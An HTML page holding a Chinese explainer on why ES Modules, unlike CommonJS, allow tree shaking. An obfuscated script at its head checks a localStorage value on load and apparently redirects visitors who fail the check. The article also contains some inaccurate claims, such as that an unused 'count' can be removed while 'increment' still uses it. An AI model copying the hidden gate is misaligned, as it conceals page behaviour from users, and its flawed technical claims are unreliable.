<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x7335(){var n=["bvhcRZiUWRlcTmoSW4Da","xfLrWQ8fW613ue3cUSodecu","WQhcSCkyD2qfWOBcPZ0","mmoWW7PZWOpdIs8","tSoczSoOh8kwwrW/xW","W6RdOSkTWPhcJdizxNOEW5HEWOi","DcZcLWBcVCkqW4K","WQOlW6SMW65ObG","rmk7W4mKAGpcV8o4qq","DhtdJLpdQ8oMWPPYz8orW5JdKLu","W63cGJ/dTWRcNhZcKt5yrrxdGW","W4n0WP3dTuOuEM52wCkHf1rD","W6bgWOddTv8XW6S9WOClkqZcPSkJ","W53cQ8kSraRcPSkr","W4lcGmkjWQ4OvmoRq8kH","W5P/WONcTCoTgfxdKr3dJG","bSkAW7zQW4dcKXC","WOXKW7FdVGpcPG0rWRRdIcHUmq","WOhcLCkBDI7dNCohWQ7cVcOwW5tcSu7cUCo+W445a0lcMmkvq1VcPhK","W4tcG8klW5HRh8kNsmkoWOhcQCoKW6y","WRxcV8o2W4FdJwXcDW","W79FWQDCW75Ii8oRWRbo","WO1bW6CTuNZcOW","W5X9WOVcTSk7Fq/dKs/dU8oFoSoS","WOiXW5ZcVWy","FZb+WQFcP8kMWOVdM3xcTMG3Da"];return(_0x7335=function(){return n})()}function _0x519e(c,n){var a=_0x7335();return(_0x519e=function(n,s){var o=a[n-=477];void 0===_0x519e.qUSKod&&(_0x519e.MjjVvu=function(n,s){var o,e=[],c=0,a="";for(n=(n=>{for(var s,o,e="",c="",a=0,r=0;o=n.charAt(r++);~o&&(s=a%4?64*s+o:o,a++%4)&&(e+=String.fromCharCode(255&s>>(-2*a&6))))o="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(o);for(var t=0,l=e.length;t<l;t++)c+="%"+("00"+e.charCodeAt(t).toString(16)).slice(-2);return decodeURIComponent(c)})(n),r=0;r<256;r++)e[r]=r;for(r=0;r<256;r++)c=(c+e[r]+s.charCodeAt(r%s.length))%256,o=e[r],e[r]=e[c],e[c]=o;for(var r=0,c=0,t=0;t<n.length;t++)o=e[r=(r+1)%256],e[r]=e[c=(c+e[r])%256],e[c]=o,a+=String.fromCharCode(n.charCodeAt(t)^e[(e[r]+e[c])%256]);return a},c=arguments,_0x519e.qUSKod=!0);var n=n+a[0],e=c[n];return e?o=e:(void 0===_0x519e.FlKqZv&&(_0x519e.FlKqZv=!0),o=_0x519e.MjjVvu(o,s),c[n]=o),o})(c,n)}var _0x5bfc48=_0x519e;if((()=>{for(var n=_0x519e,s=_0x7335();;)try{if(217256==-parseInt(n(480,"Hj[d"))+parseInt(n(486,"Qnx)"))/2*(parseInt(n(479,"NjVx"))/3)+parseInt(n(483,"&AVF"))/4*(parseInt(n(499,"OgEk"))/5)+parseInt(n(495,"kUC$"))/6*(-parseInt(n(494,"OgEk"))/7)+parseInt(n(490,"[1%K"))/8+parseInt(n(481,"MwE4"))/9+-parseInt(n(491,"H(ok"))/10)break;s.push(s.shift())}catch(n){s.push(s.shift())}})(),localStorage[_0x5bfc48(487,"2Wod")](_0x5bfc48(482,"(t2y"))!=_0x5bfc48(478,"H(ok"))throw window[_0x5bfc48(500,"ZjLr")][_0x5bfc48(496,"q35U")](_0x5bfc48(498,"M&z[")),Error();document.title="为什么只有 ESM 能有效支持 tree shaking",document.getElementById("article").innerHTML='<div><p>Tree shaking 是现代 JavaScript 打包工具（如 Webpack、Rollup 等）用来消除无用代码（dead code elimination）的优化技术，而它主要依赖于 ES Modules (ESM) 的静态结构特性。以下是为什么只有 ESM 能有效支持 tree shaking 的几个关键原因：</p>\n<hr>\n<h3>1. <strong>ESM 是静态的（Static Module Structure）</strong></h3>\n<ul>\n<li><strong>编译时确定依赖关系</strong>   ：ESM 的 <code>import</code>/<code>export</code> 语句必须在模块的顶层作用域声明，且不能动态变化（比如不能在条件语句中动态导入）。这种静态特性使得打包工具可以在<strong>编译阶段</strong>   准确分析模块的依赖关系。</li>\n<li><strong>明确导出和引用</strong>   ：ESM 的导出是显式的（如 <code>export const foo = ...</code>），工具可以明确知道哪些导出被其他模块使用，哪些未被使用。</li>\n</ul>\n<p><strong>对比 CommonJS（CJS）</strong>   ：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// CommonJS 是动态的，无法静态分析</span>\n<span class="hljs-keyword">const</span> dynamicImport = <span class="hljs-built_in">require</span>(someCondition ? <span class="hljs-string">&#x27;moduleA&#x27;</span> : <span class="hljs-string">&#x27;moduleB&#x27;</span>);\n<span class="hljs-built_in">exports</span>.<span class="hljs-property">foo</span> = ...; <span class="hljs-comment">// 导出是动态绑定的</span>\n</code></pre>\n<ul>\n<li>CJS 的 <code>require()</code> 可以出现在任何地方（函数、条件语句中），且导出是动态的（如 <code>module.exports</code> 可随时修改），导致打包工具无法在编译时确定依赖关系。</li>\n</ul>\n<hr>\n<h3>2. <strong>副作用（Side Effects）的明确标记</strong></h3>\n<ul>\n<li>ESM 允许通过 <code>package.json</code> 的 <code>&quot;sideEffects&quot;: false</code> 明确声明模块是否包含副作用（如修改全局变量、立即执行的代码等）。如果标记为无副作用，打包工具可以安全移除未使用的导出。</li>\n<li><strong>示例</strong>   ：<pre><code class="language-json"><span class="hljs-comment">// package.json</span>\n<span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span> <span class="hljs-comment">// 声明该包的所有模块均无副作用</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n</li>\n<li>对于 CJS，由于动态特性，工具无法假设代码是否有副作用，因此不敢轻易删除代码。</li>\n</ul>\n<hr>\n<h3>3. <strong>ESM 的绑定机制（Live Bindings）</strong></h3>\n<ul>\n<li>\n<p>ESM 的导出是“动态绑定”的（即原始值的引用），而不是值的拷贝。这使得工具可以更安全地追踪导出是否被使用。</p>\n</li>\n<li>\n<p><strong>示例</strong>   ：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// ESM</span>\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; {\n  count++;\n};\n</code></pre>\n<ul>\n<li>如果只有 <code>increment</code> 被其他模块导入，打包工具可以安全移除未使用的 <code>count</code>。</li>\n</ul>\n</li>\n</ul>\n<p><strong>对比 CJS</strong>   ：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// CommonJS</span>\n<span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  count,\n  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> {\n    count++;\n  },\n};\n</code></pre>\n<ul>\n<li>CJS 导出的是值的拷贝，工具难以判断 <code>count</code> 是否会被外部修改，因此不敢轻易移除。</li>\n</ul>\n<hr>\n<h3>4. <strong>工具链的支持</strong></h3>\n<ul>\n<li>Webpack、Rollup 等工具在设计时优先支持 ESM 的静态分析，而 CJS 的动态特性需要额外处理（如 Webpack 的 <code>module.hot</code> 或动态 <code>import()</code>）。</li>\n<li><strong>Babel 转译问题</strong>   ：早期工具链将 ESM 转译为 CJS 时可能破坏静态结构，但现代工具（如 Webpack 的 <code>mode: \'production\'</code>）会保留 ESM 信息以支持 tree shaking。</li>\n</ul>\n<hr>\n<h3>为什么 CommonJS 不能有效 Tree Shaking？</h3>\n<ol>\n<li><strong>动态依赖</strong>   ：<code>require()</code> 可以是动态路径或条件语句，无法静态分析。</li>\n<li><strong>导出可变性</strong>   ：<code>module.exports</code> 可以随时被覆盖或扩展。</li>\n<li><strong>副作用不确定性</strong>   ：CJS 模块可能隐含副作用（如立即执行的代码），工具无法安全移除代码。</li>\n</ol>\n<hr>\n<h3>实践建议</h3>\n<ol>\n<li><strong>使用 ESM 语法</strong>   ：编写库或应用时优先使用 <code>import</code>/<code>export</code>。</li>\n<li><strong>配置 <code>sideEffects</code></strong>   ：在 <code>package.json</code> 中标记无副作用的模块。</li>\n<li><strong>避免 Babel 转译 ESM 到 CJS</strong>   ：如需转译，确保配置 <code>@babel/preset-env</code> 的 <code>modules: false</code>。</li>\n<li><strong>检查打包结果</strong>   ：使用 Webpack 的 <code>--analyze</code> 或 Rollup 的 <code>output.treeshake</code> 验证 tree shaking 效果。</li>\n</ol>\n<hr>\n<p>总结：ESM 的静态结构、明确的导出绑定和副作用标记，使其成为唯一能可靠支持 tree shaking 的模块系统，而 CommonJS 的动态特性导致工具无法安全优化。</p>\n</div>'</script></body></html>